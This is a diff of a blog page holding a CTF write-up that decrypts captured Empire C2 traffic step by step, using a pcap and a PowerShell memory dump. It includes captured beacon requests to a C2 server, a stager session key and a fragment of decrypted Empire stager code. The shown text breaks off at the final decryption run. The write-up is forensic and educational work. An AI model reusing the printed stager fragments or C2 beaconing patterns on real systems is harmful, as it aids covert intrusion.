@@ -6,13 +6,15 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
 <title>Empire is at Risk - Writeup | Journal of Connar</title>
-<meta name="keywords" content="empire c2">
-<meta name="description" content="In this challenge we are given:
+<meta name="keywords" content="">
+<meta name="description" content="Intro
+In this challenge we are given:
 
     A pcap file (capture.pcap)
     A powershell dump (powershell.DMP)
 
 A lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for Empire C2 (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.
+Reference material to solve the challenge
 Navigating through some posts, a very good one that I used as a reference while solving the challenge was:">
 <meta name="author" content="connar">
 <link rel="canonical" href="http://localhost:1313/ctfwriteups/empirec2/">
@@ -155,17 +157,50 @@ Navigating through some posts, a very good one that I used as a reference while 
     <h1 class="post-title entry-hint-parent">
       Empire is at Risk - Writeup
     </h1>
-    <div class="post-meta">12 min&nbsp;·&nbsp;connar
+    <div class="post-meta">15 min&nbsp;·&nbsp;connar
 
 </div>
-  </header> 
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
 
-  <div class="post-content"><p>In this challenge we are given:</p>
+        <div class="inner"><ul>
+                <li>
+                    <a href="#intro" aria-label="Intro">Intro</a></li>
+                <li>
+                    <a href="#reference-material-to-solve-the-challenge" aria-label="Reference material to solve the challenge">Reference material to solve the challenge</a></li>
+                <li>
+                    <a href="#getting-the-rc4-key" aria-label="Getting the RC4 key">Getting the RC4 key</a></li>
+                <li>
+                    <a href="#stage-0" aria-label="Stage 0">Stage 0</a></li>
+                <li>
+                    <a href="#stage-1" aria-label="Stage 1">Stage 1</a><ul>
+                        
+                <li>
+                    <a href="#stage-1---aes-decryption-to-get-rsa-pubkey" aria-label="Stage 1 - AES decryption to get RSA PubKey">Stage 1 - AES decryption to get RSA PubKey</a></li>
+                <li>
+                    <a href="#stage-1---extracting-rsa-privkey-from-minidump" aria-label="Stage 1 - Extracting RSA PrivKey from minidump">Stage 1 - Extracting RSA PrivKey from minidump</a></li>
+                <li>
+                    <a href="#stage-1---rsa-decryption-to-get-empires-nonce-and-sessionkey" aria-label="Stage 1 - RSA decryption to get Empire&rsquo;s nonce and SessionKey">Stage 1 - RSA decryption to get Empire&rsquo;s nonce and SessionKey</a></li></ul>
+                </li>
+                <li>
+                    <a href="#stage-2---decrypting-rest-of-the-packets" aria-label="Stage 2 - Decrypting rest of the packets">Stage 2 - Decrypting rest of the packets</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h1>
+<p>In this challenge we are given:</p>
 <blockquote>
     <p>A pcap file (capture.pcap)</p>
     <p>A powershell dump (powershell.DMP)</p>
 </blockquote>
 <p>A lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for <code>Empire C2</code> (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.</p>
+<h1 id="reference-material-to-solve-the-challenge">Reference material to solve the challenge<a hidden class="anchor" aria-hidden="true" href="#reference-material-to-solve-the-challenge">#</a></h1>
 <p>Navigating through some posts, a very good one that I used as a reference while solving the challenge was:</p>
 <ul>
 <li><code>https://www.keysight.com/blogs/en/tech/nwvs/2021/06/16/empire-c2-networking-into-the-dark-side</code></li>
@@ -174,7 +209,9 @@ Navigating through some posts, a very good one that I used as a reference while 
 <pre tabindex="0"><code>STAGE 0 - First, the victim sends a GET beacon with a cookie in the HTTP headers, server replies with 200 OK with a big (~ 5.5 KB) encrypted payload.
 STAGE 1 - The victim sends a POST message with an encrypted payload, to which server sends a 200 OK response with a small payload.
 STAGE 2 - Finally, the victim sends another POST message, to which server replies with an even bigger (~ 41KB) payload.
-</code></pre><p>Before we head to STAGE 0, we need to find the dropper. Navigating through the first TCP streams, we will end up finding the following packet:</p>
+</code></pre><p>I will show how to proceed to each step and gather all the required info to decrypt the traffic.</p>
+<h1 id="getting-the-rc4-key">Getting the RC4 key<a hidden class="anchor" aria-hidden="true" href="#getting-the-rc4-key">#</a></h1>
+<p>Before we head to STAGE 0, we need to find the dropper. Navigating through the first TCP streams, we will end up finding the following packet:</p>
 <pre tabindex="0"><code>
 PS C:\Windows\system32&gt; whoami
 corp\satadministrator
@@ -238,7 +275,8 @@ It also sets a cookie encrypted with the same RC4 key: <code>PmLsmcRe+Q/gzLQbJmN
 +-----------|--------|--------|---------|-------- |
 | 00000000  | 01     | 01     | 0000    | 0000    |
 +-----------|--------|--------|---------|---------|
-</code></pre><p>Great, now let&rsquo;s head to the response of the <code>GET /news.php</code> which contains the encrypted STAGE 0 code.</p>
+</code></pre><h1 id="stage-0">Stage 0<a hidden class="anchor" aria-hidden="true" href="#stage-0">#</a></h1>
+<p>Great, now let&rsquo;s head to the response of the <code>GET /news.php</code> which contains the encrypted STAGE 0 code.</p>
 <pre tabindex="0"><code>GET /news.php HTTP/1.1
 Cookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
@@ -552,7 +590,8 @@ Y...2.6cA.=....A...IC`.LUo..3.I\........`......U.......p
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Start - Negotiate  - s <span style="color:#e6db74">&#34;</span>$ser<span style="color:#e6db74">&#34;</span>  - SK \<span style="color:#e6db74">&#39;ewtVZiN~5)13Cx.M@oOJyp^G &gt; TRWq(#b\&#39;</span>  - UA $u  - hop <span style="color:#e6db74">&#34;</span>$hop<span style="color:#e6db74">&#34;</span>;
-</span></span></code></pre></div><p>Continuing with the next pair of HTTP request-response, we are met with the following packet:</p>
+</span></span></code></pre></div><h1 id="stage-1">Stage 1<a hidden class="anchor" aria-hidden="true" href="#stage-1">#</a></h1>
+<p>Continuing with the next pair of HTTP request-response, we are met with the following packet:</p>
 <pre tabindex="0"><code>POST /login/process.php HTTP/1.1
 Cookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
@@ -578,19 +617,20 @@ Connection: close
 ...Ykf..nTfW.g..EzR....
 ...:V....}K.}y.NhE.v..r....0..C..H..sP.9.Vo..i.b|.S.....?.s&amp;.BXv3..._P........^8..h...32./.Xd..*.....{.~..7.c.+..
 </code></pre><p>Based on the articles instructions, we update our script to decrypt the first [4:19] bytes to see at what stage we are now:</p>
-<pre tabindex="0"><code>from Crypto.Cipher import ARC4
-
-key = b&#39;ewtVZiN~5)13Cx.M@oOJyp^G&gt;TRWq(#b&#39;
-enc_data = &#34;8e15a81b0cb93c54dd4cbf8cf105cd5727b1d0c7af9c952546a5c05324617d21d468b464582ed8f156fbeb3b0d3a377e1416aeb21d8c013830141e4383f4bf4855ba5eb156f0aeefda62883d646a0a446a16bc94ddd7780cca739cc5c28dd7caf3783822060555c4f0d0f5e0f9044ad2ce452addde11c335489611c588f0e47347273e23e29d4fd956fd3846b57d62027774b33a9d963d55e00dcc018f95400d25852db856f0be9bf3816c94ea12ab9aa8db5217e20352995025b81dbaa23c2f253804bdcd48e4662cd5f035112de674d2572a70958c2a96c1a06bd767b933841d4204dd6558314f7ded14fb9633919afaf1fa214ac95e6ccfa053b749fc61be80c8e2e2bc416dc5c6af88fa44552b12a3f6e138c10cbccaacc5df76eb282961b2696876b312c6bff0da82e81c9694776481a47b923a26e62f5486e09878595ff7480677124fedd7404e9fb15d769cacc64dfbbbb1c527e6ef7ce1166a39ffc015ec9a3f6e88ed47e30e729f290787fa424ef98c50705c31216b9e5d9723a11eeeccc76325ce32b1b5f6b5fb1deb1861544f7484607d2ecdf25abad79d1900d8cab257e1b7290ce5dbc7211d45c547c3f0972ba228daddd6728aba0b36a70bdbc2cd95a3f56b2efd5e684042a721&#34;
-
-encr_data = bytes.fromhex(enc_data)
-
-cipher = ARC4.new(encr_data[0:4] + key)
-msg = cipher.decrypt(encr_data[4:19])
-print(&#34;[+] RC4 Decrypted:&#34;, msg)
-</code></pre><p>And we get the following: <code>[+] RC4 Decrypted: b'EBXWPAHZ\x01\x02\x00\x00\xba\x01\x00'</code>.<br>
-Notice that the third column has changed from <code>01</code> to <code>02</code> indicating we are now in stage 2. The \xba\x01 indicates how many bytes has to still be decrypted (after the first 20 bytes we just decrypted) to successfully decrypt the rest of the payload.</p>
-<p>The twist here is that Empire C2 based on the article, in stage 2, uses AES decryption to decrypt the rest of the \xba\x01 bytes. This can also be assumed from the decrypted STAGE 0 payload that contained powershell code performing AES CBC decryption.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ewtVZiN~5)13Cx.M@oOJyp^G&gt;TRWq(#b&#39;</span>
+</span></span><span style="display:flex;"><span>enc_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;8e15a81b0cb93c54dd4cbf8cf105cd5727b1d0c7af9c952546a5c05324617d21d468b464582ed8f156fbeb3b0d3a377e1416aeb21d8c013830141e4383f4bf4855ba5eb156f0aeefda62883d646a0a446a16bc94ddd7780cca739cc5c28dd7caf3783822060555c4f0d0f5e0f9044ad2ce452addde11c335489611c588f0e47347273e23e29d4fd956fd3846b57d62027774b33a9d963d55e00dcc018f95400d25852db856f0be9bf3816c94ea12ab9aa8db5217e20352995025b81dbaa23c2f253804bdcd48e4662cd5f035112de674d2572a70958c2a96c1a06bd767b933841d4204dd6558314f7ded14fb9633919afaf1fa214ac95e6ccfa053b749fc61be80c8e2e2bc416dc5c6af88fa44552b12a3f6e138c10cbccaacc5df76eb282961b2696876b312c6bff0da82e81c9694776481a47b923a26e62f5486e09878595ff7480677124fedd7404e9fb15d769cacc64dfbbbb1c527e6ef7ce1166a39ffc015ec9a3f6e88ed47e30e729f290787fa424ef98c50705c31216b9e5d9723a11eeeccc76325ce32b1b5f6b5fb1deb1861544f7484607d2ecdf25abad79d1900d8cab257e1b7290ce5dbc7211d45c547c3f0972ba228daddd6728aba0b36a70bdbc2cd95a3f56b2efd5e684042a721&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encr_data <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(enc_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(encr_data[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> key)
+</span></span><span style="display:flex;"><span>msg <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(encr_data[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">19</span>])
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] RC4 Decrypted:&#34;</span>, msg)
+</span></span></code></pre></div><p>And we get the following: <code>[+] RC4 Decrypted: b'EBXWPAHZ\x01\x02\x00\x00\xba\x01\x00'</code>.<br>
+Notice that the third column has changed from <code>01</code> to <code>02</code> indicating we are now in stage 1. The <code>\xba\x01</code> indicates how many bytes has to still be decrypted (after the first 20 bytes we just decrypted) to successfully decrypt the rest of the payload.</p>
+<h2 id="stage-1---aes-decryption-to-get-rsa-pubkey">Stage 1 - AES decryption to get RSA PubKey<a hidden class="anchor" aria-hidden="true" href="#stage-1---aes-decryption-to-get-rsa-pubkey">#</a></h2>
+<p>The twist here is that Empire C2 based on the article, in stage 2, uses AES decryption to decrypt the rest of the <code>\xba\x01</code> bytes. This can also be assumed from the decrypted STAGE 0 payload that contained powershell code performing <code>AES CBC</code> decryption.</p>
 <p>Based on this information, we update our script to handle the remaining bytes:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span>  AES
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
@@ -612,27 +652,29 @@ Notice that the third column has changed from <code>01</code> to <code>02</code>
 </span></span><span style="display:flex;"><span>decrypted_text <span style="color:#f92672">=</span> aes_decrypt(encr_data[<span style="color:#ae81ff">20</span>:], key)
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] AES Decrypted:&#34;</span>, decrypted_text)
 </span></span></code></pre></div><p>Running it, we get:</p>
-<pre tabindex="0"><code>└─$ python rc4_decrypt.py
-[+] AES Decrypted: b&#39;&lt;RSAKeyValue&gt;&lt;Modulus&gt;xzZdhYfhAmxwd+qFhfLfXuIAJsQeE5tVsFO0zKXbnwytKA+1wkZIGpO6QsTuJ3FAeTdOJjbypnBBDtuuPj/VfHl62Odn95LemkFqKLig13zaGLWd9Cn26ZyobbMfavrySKT+jFgNPaCYpvVLOyAeHZJa1/sGr0E/AdUGhG1l5tWmlm4Kl4Qe5yXp/ySpFflA0W/AzYVtVndm5tiC5GTGuy3Nes+Wedl0wMM9cMrVGusyawdre2B5VtjuuAFSUKlbEoSyxBhCDpJ0t+wHidBnRZzu9nS6J9wWYr/iT6xufZELpSGw56oIQGwp1mTcAjCQ7urtp6lvRJ7nm+Gat38JTQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt;\x01\x00\xe4\x9ct\xb3\x0e\xd0\xd8o\xddJ82_\xe8&lt;&#39;
-</code></pre><p>We are met with an RSA public key. The article indicates that in the STAGE 1 traffic, an RSA PEM was sent in the request and the response was encrypted with the RSA private key. The article suggests that using the RSA public key we could decrypt the response, something that I did not manage to do. Now what?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> python rc4_decrypt<span style="color:#f92672">.</span>py
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] AES Decrypted: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;RSAKeyValue&gt;&lt;Modulus&gt;xzZdhYfhAmxwd+qFhfLfXuIAJsQeE5tVsFO0zKXbnwytKA+1wkZIGpO6QsTuJ3FAeTdOJjbypnBBDtuuPj/VfHl62Odn95LemkFqKLig13zaGLWd9Cn26ZyobbMfavrySKT+jFgNPaCYpvVLOyAeHZJa1/sGr0E/AdUGhG1l5tWmlm4Kl4Qe5yXp/ySpFflA0W/AzYVtVndm5tiC5GTGuy3Nes+Wedl0wMM9cMrVGusyawdre2B5VtjuuAFSUKlbEoSyxBhCDpJ0t+wHidBnRZzu9nS6J9wWYr/iT6xufZELpSGw56oIQGwp1mTcAjCQ7urtp6lvRJ7nm+Gat38JTQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt;</span><span style="color:#ae81ff">\x01\x00\xe4\x9c</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\xb3\x0e\xd0\xd8</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\xdd</span><span style="color:#e6db74">J82_</span><span style="color:#ae81ff">\xe8</span><span style="color:#e6db74">&lt;&#39;</span>
+</span></span></code></pre></div><p>We are met with an RSA public key. The article indicates that in the STAGE 1 traffic, an RSA PEM was sent in the request and the response was encrypted with the RSA private key. The article suggests that using the RSA public key we could decrypt the response, something that I did not manage to do. Now what?</p>
+<h2 id="stage-1---extracting-rsa-privkey-from-minidump">Stage 1 - Extracting RSA PrivKey from minidump<a hidden class="anchor" aria-hidden="true" href="#stage-1---extracting-rsa-privkey-from-minidump">#</a></h2>
 <p>Recall that along with the pcap file, we were given a powershell minidump of the victims machine. I also recalled a similar challenge from HTB were you had to extract a key from a powershell minidump to decrypt traffic, so i thought this might be the case. I tried a bunch of tools and I got lucky with the following tool:</p>
 <ul>
 <li><a href="https://github.com/naacbin/CovenantDecryptor/blob/main/extract_privatekey.py">https://github.com/naacbin/CovenantDecryptor/blob/main/extract_privatekey.py</a></li>
 </ul>
 <p>This repository also has a script to decrypt the whole traffic, but there is no fun in that!<br>
 So what I did was to convert to a number the base64 modulus N from the public key and use that with the tool to get the factors <code>p</code> and <code>q</code>. But truth is, I don&rsquo;t even need to get the factors separately to recreate the private key - the tool takes care of that providing a final privkey.pem file.</p>
-<pre tabindex="0"><code>└─$ python extract_private_key.py -i powershell.DMP -m 25148231226098036568609085786032493445047970858838750757353784046851780996252815164646595354657712347303902433050994584748229413761156337576101444810190533703870848976912366148228482653348855081349089844894215870541245746763769526279157470729874284392842948681388833599108264376759680056204274109786502052449471112587419970215023968989031953153074974224971309706651080504728448055280751647021310124504423016412562368406349427252523767629273098705526800196895955775193783311406083938956019398407824378637691235681260892457410354167254736588107208133326588940908108092201039005698412773934207300784362999497054207543629 -o ./
-[-] A pair of P and Q were located, but they do not match the modulus.
-[-] A pair of P and Q were located, but they do not match the modulus.
-[-] A pair of P and Q were located, but they do not match the modulus.
-p = 
-150956452089032925291860870726198111603099541025300342333620399744356915258819492908817503860740117387753537741614261518421211406637997667084060302456525289568916888709137393722618808502204768902619690472878363471641168599211223
-012394804175169720239746303980466444986602638061450001494265915151494105179625839
-q = 
-166592622429055288486164345109844143518609430500796394935657230876873251019149580311937449492539553993684365940867416075970157500630000590374888054804987267317822674555104708403999018304929733771124856592150400779922363207718221
-865544295510633783738240215332006595869963087595654764820798172520369633815204611
-[+] Saved private key /home/connar/Downloads/empireAtRisk/privkey1.pem
-</code></pre><p>Now that we have the private key, let&rsquo;s try and decrypt the response bytes with it. I tried extracting the <code>d</code> value to manually decrypt, but then reading through the <a href="https://pycryptodome-master.readthedocs.io/en/latest/src/cipher/pkcs1_v1_5.html#pkcs-1-v1-5-encryption-rsa">docs</a> of how to use the .pem key itself for decryption, i got a more clean result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> python extract_private_key<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>i powershell<span style="color:#f92672">.</span>DMP <span style="color:#f92672">-</span>m <span style="color:#ae81ff">25148231226098036568609085786032493445047970858838750757353784046851780996252815164646595354657712347303902433050994584748229413761156337576101444810190533703870848976912366148228482653348855081349089844894215870541245746763769526279157470729874284392842948681388833599108264376759680056204274109786502052449471112587419970215023968989031953153074974224971309706651080504728448055280751647021310124504423016412562368406349427252523767629273098705526800196895955775193783311406083938956019398407824378637691235681260892457410354167254736588107208133326588940908108092201039005698412773934207300784362999497054207543629</span> <span style="color:#f92672">-</span>o <span style="color:#f92672">./</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>] A pair of P <span style="color:#f92672">and</span> Q were located, but they do <span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span> the modulus<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>] A pair of P <span style="color:#f92672">and</span> Q were located, but they do <span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span> the modulus<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>] A pair of P <span style="color:#f92672">and</span> Q were located, but they do <span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span> the modulus<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150956452089032925291860870726198111603099541025300342333620399744356915258819492908817503860740117387753537741614261518421211406637997667084060302456525289568916888709137393722618808502204768902619690472878363471641168599211223</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">012394804175169720239746303980466444986602638061450001494265915151494105179625839</span>
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">166592622429055288486164345109844143518609430500796394935657230876873251019149580311937449492539553993684365940867416075970157500630000590374888054804987267317822674555104708403999018304929733771124856592150400779922363207718221</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">865544295510633783738240215332006595869963087595654764820798172520369633815204611</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Saved private key <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>connar<span style="color:#f92672">/</span>Downloads<span style="color:#f92672">/</span>empireAtRisk<span style="color:#f92672">/</span>privkey1<span style="color:#f92672">.</span>pem
+</span></span></code></pre></div><h2 id="stage-1---rsa-decryption-to-get-empires-nonce-and-sessionkey">Stage 1 - RSA decryption to get Empire&rsquo;s nonce and SessionKey<a hidden class="anchor" aria-hidden="true" href="#stage-1---rsa-decryption-to-get-empires-nonce-and-sessionkey">#</a></h2>
+<p>Now that we have the private key, let&rsquo;s try and decrypt the response bytes with it. I tried extracting the <code>d</code> value to manually decrypt, but then reading through the <a href="https://pycryptodome-master.readthedocs.io/en/latest/src/cipher/pkcs1_v1_5.html#pkcs-1-v1-5-encryption-rsa">docs</a> of how to use the .pem key itself for decryption, i got a more clean result:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto <span style="color:#f92672">import</span> Random
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> PKCS1_v1_5
@@ -647,13 +689,93 @@ q =
 </span></span><span style="display:flex;"><span>decrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(encr, sentinel)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;nonce: </span><span style="color:#e6db74">{</span>decrypted[:<span style="color:#ae81ff">16</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">SessionKey: </span><span style="color:#e6db74">{</span>decrypted[<span style="color:#ae81ff">16</span>:]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span></code></pre></div>
+</span></span></code></pre></div><p>Running it, we get the nonce and the SessionKey:</p>
+<pre tabindex="0"><code>└─$ python rsa_privkey_decrypt.py
+nonce: b&#39;6486863263721433&#39;
+SessionKey: b&#39;d%~gc_:vhZP+.VHWsolQEz1}ICKma;D@&#39;
+</code></pre><p>And we got two values that look promising - promising in the sense that they look like values that the post was showcasing. These values according to the post, will now be used to decrypt the rest of the packets with AES.CBC with the <code>nonce</code> as the <code>IV</code> and the <code>SessionKey</code> as the new <code>Key</code>. We are now ready to proceed to STAGE 2!</p>
+<h1 id="stage-2---decrypting-rest-of-the-packets">Stage 2 - Decrypting rest of the packets<a hidden class="anchor" aria-hidden="true" href="#stage-2---decrypting-rest-of-the-packets">#</a></h1>
+<p>We move to the third Request - Response pair where we will try to decrypt the first 20 bytes again to verify we are at the third stage (STAGE 2):</p>
+<pre tabindex="0"><code>POST /admin/get.php HTTP/1.1
+Cookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=
+Hop-Name: 
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 77.74.198.52:8083
+Content-Length: 222
+
+......%Dg..D.&amp;..ua..`V..6.&amp;T....&gt;.:)M{. .&#34;yw..vg}.y..D...q.}Zr..z.
+h&gt;.8s@..4...&gt;.P.[.....q...Q....h.......T..
+.KI@.
+
+.(C.b.v......YF{:..O.....|(.B..O...,,s.P],h....%.`vTk..|:.L...Z..,..y56.K...G.........o..... .|.......:..HTTP/1.1 200 OK
+Server: Werkzeug/2.1.2 Python/3.9.13
+Date: Tue, 30 Aug 2022 16:35:52 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 41402
+Cache-Control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Expires: 0
+Server: Microsoft-IIS/7.5
+Connection: close
+
+.hE
+.e..1....&#34;.F.......$C.Lu....!Z.&lt;7...f..bV..)...@..7........q(	S.Dy.{....%ROX.F.L/.?....$J..4.s.z[.....V...a....t..4.;R. .....L..&#34;D.g.z....._p[..s..............&gt;.@{.^.x....tP..|...%..M..tr/V9,.q....|~#w..hk*.wfd..X...pb..W&#34;......Z&#34;...r&gt;DJ.......t/(&amp;MJ..U....nQ.....$.s.(j.;...............&lt;....V.....1...E.......Lu...!...+3.J.0r.....8t..X]..;.....^.....&lt;.|....g3=..1...V.Y.Qj...g......v2l(.t.a.!s..s... ..7
+.R...P......D.hp...FE......p..4.[..O~.B..&#39;...L.....:.@8...z....M.......c...B.&gt;..x.x........,.sGCl.i?^...|7.^%..g...[PXhc
+..i.]-0.!7&lt;.....q....k..RX..B.C..x.QNz9.3...!,]..U..N.Q0f..&#39;.!&amp;.r.}U...&amp;.Q.=..Mm...a...g.................ZV...........SLZ
+...d....8e.+_.......7..&amp;.P.....k&#34;..._..
+.jk.
+;.:.....o.R.K#.C..m)...^J..$...r5,M
+u.i..DRd....... .....}.A...u}....Miw..S..(..P...G@d.@.D.....Ty.ve.....qF.....r......=.9........%.y.f(..........
+p).......I.,Ft..&gt;.m.GK..&#39;...m..*..P...&#34;...b&#34;.#q --more bytes--
+</code></pre><p>Running our previous <code>rc4-decrypt.py</code> script, we indeed get the feedback that we are in the final stage:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> python rc4_decrypt<span style="color:#f92672">.</span>py        
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] RC4 Decrypted: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;EBXWPAHZ</span><span style="color:#ae81ff">\x01\x03\x00\x00\xca\x00\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><p>We will now get the response bytes and decrypt them using <code>AES.CBC</code> with the <code>nonce</code> and <code>SessionKey</code> we previously found. Using a previous script I made for the AES.CBC decryption - now updated with the new values, we end up with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span>  AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aes_decrypt</span>(ciphertext, key):
+</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> pad(ciphertext, AES<span style="color:#f92672">.</span>block_size)
+</span></span><span style="display:flex;"><span>    iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6486863263721433&#39;</span>
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(ciphertext[<span style="color:#ae81ff">16</span>:])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plaintext
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;d%~gc_:vhZP+.VHWsolQEz1}ICKma;D@&#39;</span>
+</span></span><span style="display:flex;"><span>enc_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1368450d8e65198d31b9e1bba522cb4611f9d89 --rest of response bytes--&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encr_data <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(enc_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>decrypted_text <span style="color:#f92672">=</span> aes_decrypt(encr_data, key)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] AES Decrypted:&#34;</span>, decrypted_text)
+</span></span></code></pre></div><p>Running it, we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─</span>$ python aes_decrypt.py 
